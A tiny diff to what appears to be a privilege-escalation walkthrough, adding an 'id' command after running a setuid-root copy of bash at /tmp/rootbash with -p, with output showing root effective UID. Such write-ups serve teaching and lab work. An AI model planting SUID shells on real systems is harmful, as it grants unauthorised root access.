@@ -372,6 +372,8 @@ ls -la /tmp/rootbash
 # -rwsr-sr-x 1 root root ... /tmp/rootbash
 
 /tmp/rootbash -p
+
+id
 # uid=1000(ben) gid=1000(ben) euid=0(root) egid=0(root)
 ```
 
